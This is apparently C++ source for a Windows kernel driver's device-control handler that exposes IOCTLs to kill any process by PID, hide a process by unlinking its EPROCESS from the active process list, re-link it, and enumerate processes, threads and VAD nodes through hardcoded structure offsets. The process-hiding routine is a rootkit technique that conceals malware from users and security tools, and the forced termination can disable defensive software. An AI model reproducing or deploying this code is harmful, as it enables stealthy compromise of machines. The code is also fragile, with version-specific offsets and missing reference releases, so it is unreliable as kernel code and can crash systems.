
#include "devicecontrolhandler.h"


NTSTATUS TerminateProcess(UINT32 pid) {

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	CLIENT_ID clientid{ 0 };
	clientid.UniqueProcess = (HANDLE)pid;

	HANDLE processhandle;
	NTSTATUS res = ZwOpenProcess(&processhandle, PROCESS_ALL_ACCESS, &oa, &clientid);
	if (!NT_SUCCESS(res)) {
		return res;
	}


	res = ZwTerminateProcess(processhandle, STATUS_PROCESS_IS_TERMINATING);
	if (!NT_SUCCESS(res)) {
		ZwClose(processhandle);
		return res;
	}


	ZwClose(processhandle);
	return STATUS_SUCCESS;



}


static int vadcount = 0;

void traverse_vadtree(PRTL_BALANCED_NODE node) {

	if (node == NULL) {
		return;
	}

	vadcount++;

	if (node->Left != NULL) {
		traverse_vadtree(node->Left);
	}

	if (node->Right != NULL) {
		traverse_vadtree(node->Right);
	}


}



// we no need to return here since our irphandler returned QueueIRP() already
extern "C" NTSTATUS devicecontrolhandler(PDEVICE_OBJECT fdo, PIRP irp) {

	UNREFERENCED_PARAMETER(fdo);

	KdPrint(("we got IRP_MJ_DEVICE_CONTROL\n"));

	PIO_STACK_LOCATION iostacklocation = IoGetCurrentIrpStackLocation(irp);
	ULONG ioctl = iostacklocation->Parameters.DeviceIoControl.IoControlCode;



	if ((fdo->Flags & DO_BUFFERED_IO) == DO_BUFFERED_IO) {

		PVOID systembuffer = irp->AssociatedIrp.SystemBuffer;

		if (!systembuffer) {
			irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
			irp->IoStatus.Information = 0;
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return STATUS_UNSUCCESSFUL;
		}

		if (ioctl == TERMINATE_PROCESS) {

			ULONG inputbufferlength = iostacklocation->Parameters.DeviceIoControl.InputBufferLength;
			//ULONG outputbufferlength = iostacklocation->Parameters.DeviceIoControl.OutputBufferLength;


			if (inputbufferlength != sizeof(PROCESS_ID)) {
				irp->IoStatus.Status = STATUS_BUFFER_TOO_SMALL;
				irp->IoStatus.Information = 0;
				IoCompleteRequest(irp, IO_NO_INCREMENT);
				return STATUS_BUFFER_TOO_SMALL;
			}

			PPROCESS_ID pid = (PPROCESS_ID)systembuffer;
			NTSTATUS res = TerminateProcess(pid->pid);
			irp->IoStatus.Status = res;
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return res;




		}


		if (ioctl == PRINT_ALL_PROCESSES) {

			PEPROCESS eprocess;
			NTSTATUS res = PsLookupProcessByProcessId(PsGetCurrentProcessId(), &eprocess);
			if (!NT_SUCCESS(res)) {
				irp->IoStatus.Status = res;
				irp->IoStatus.Information = 0;
				IoCompleteRequest(irp, IO_NO_INCREMENT);
				return res;

			}

			unsigned char buffer[15]{ 0 };
			PEPROCESS temp = eprocess;
			// 0x448 activeprocesslinks offset
			PLIST_ENTRY le = (PLIST_ENTRY)((char*)temp + 0x448);
			
			while (le->Flink && ((char*)le->Flink - 0x448) != (char*)eprocess) {

				// 0x5a8 imagefilename offset
				RtlZeroMemory(&buffer[0], 15);
				RtlCopyMemory(&buffer[0], (char*)temp + 0x5a8, 15);
				buffer[14] = '\0';

				KdPrint(("process name: %s\n", &buffer[0]));

				temp = (PEPROCESS)((char*)le->Flink - 0x448);
				le = (PLIST_ENTRY)((char*)temp + 0x448);



			}




			ObDereferenceObject(eprocess);
			irp->IoStatus.Status = STATUS_SUCCESS;
			irp->IoStatus.Information = 0;
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return STATUS_SUCCESS;




		}


		if (ioctl == HIDE_PROCESS) {

			int pid = *(int*)systembuffer;

			PEPROCESS eprocess; // target process's eprocess
			NTSTATUS res = PsLookupProcessByProcessId((HANDLE)pid, &eprocess);
			if (!NT_SUCCESS(res)) {
				irp->IoStatus.Status = res;
				irp->IoStatus.Information = 0;
				IoCompleteRequest(irp, IO_NO_INCREMENT);
				return res;
			}

			KdPrint(("target process EPROCESS: %p\n", eprocess));

			PLIST_ENTRY le = (PLIST_ENTRY)((char*)eprocess + 0x448);
			PEPROCESS previouseprocess = (PEPROCESS)((char*)le->Blink - 0x448);
			PEPROCESS nexteprocess = (PEPROCESS)((char*)le->Flink - 0x448);


			((PLIST_ENTRY)((char*)previouseprocess + 0x448))->Flink = le->Flink;
			((PLIST_ENTRY)((char*)nexteprocess + 0x448))->Blink = le->Blink;


			irp->IoStatus.Status = STATUS_SUCCESS;
			irp->IoStatus.Information = 0;
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return STATUS_SUCCESS;


		}


		if (ioctl == UNHIDE_PROCESS) {

			if (iostacklocation->Parameters.DeviceIoControl.InputBufferLength != sizeof(datatosend)) {
				irp->IoStatus.Status = STATUS_BUFFER_TOO_SMALL;
				irp->IoStatus.Information = 0;
				IoCompleteRequest(irp, IO_NO_INCREMENT);
				return STATUS_BUFFER_TOO_SMALL;
			}

			pdatatosend data = (pdatatosend)systembuffer;
			LONGLONG eprocess = data->eprocess;
			KdPrint(("we received eprocess: %p\n", eprocess));
			PLIST_ENTRY le = (PLIST_ENTRY)((char*)eprocess + 0x448);
			PEPROCESS previouseprocess = (PEPROCESS)((char*)le->Blink - 0x448);
			PEPROCESS nexteprocess = (PEPROCESS)((char*)le->Flink - 0x448);


			((PLIST_ENTRY)((char*)previouseprocess + 0x448))->Flink = le;
			((PLIST_ENTRY)((char*)nexteprocess + 0x448))->Blink = le;


			irp->IoStatus.Status = STATUS_SUCCESS;
			irp->IoStatus.Information = 0;
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return STATUS_SUCCESS;

		}

		
		if (ioctl == PRINT_ALL_THREADS) {

			int pid = *(int*)systembuffer;

			PEPROCESS eprocess;
			NTSTATUS res = PsLookupProcessByProcessId((HANDLE)pid, &eprocess);
			if (!NT_SUCCESS(res)) {
				irp->IoStatus.Status = res;
				irp->IoStatus.Information = 0;
				IoCompleteRequest(irp, IO_NO_INCREMENT);
				return res;
			}


			/*
			1: kd> dt nt!_ethread threadlistentry
				   +0x4e8 ThreadListEntry : _LIST_ENTRY
				1: kd> dt nt!_ethread cid
				   +0x478 Cid : _CLIENT_ID
				1: kd> dt nt!_eprocess threadlisthead
				   +0x5e0 ThreadListHead : _LIST_ENTRY

			*/


			PLIST_ENTRY threadlisthead = (PLIST_ENTRY) ((char*)eprocess + 0x5e0);

			PLIST_ENTRY temp = threadlisthead->Flink;

			while (temp != threadlisthead) {


				PETHREAD ethread = (PETHREAD) ((char*)temp - 0x4e8);
				PCLIENT_ID pclientid = (PCLIENT_ID)((char*)ethread + 0x478);
				KdPrint(("Process id: %x\n", pclientid->UniqueProcess));
				KdPrint(("Thread id: %x\n", pclientid->UniqueThread));

				temp = temp->Flink;


			}


			
			irp->IoStatus.Status = STATUS_SUCCESS;
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return STATUS_SUCCESS;


		}


		if (ioctl == PRINT_ALL_DLLS) {

			int pid = *(int*)systembuffer;

			PEPROCESS eprocess;
			NTSTATUS res = PsLookupProcessByProcessId((HANDLE)pid, &eprocess);
			if (!NT_SUCCESS(res)) {
				irp->IoStatus.Status = res;
				irp->IoStatus.Information = 0;
				IoCompleteRequest(irp, IO_NO_INCREMENT);
				return res;
			}

			// 0x7d8 vadroot offset
			PRTL_BALANCED_NODE node = (PRTL_BALANCED_NODE)((char*)eprocess + 0x7d8);

			traverse_vadtree(node);
		

			KdPrint(("vadcount: %d\n", vadcount));

			irp->IoStatus.Status = STATUS_SUCCESS;
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return STATUS_SUCCESS;
		}


	}

	
	irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_UNSUCCESSFUL;	

}
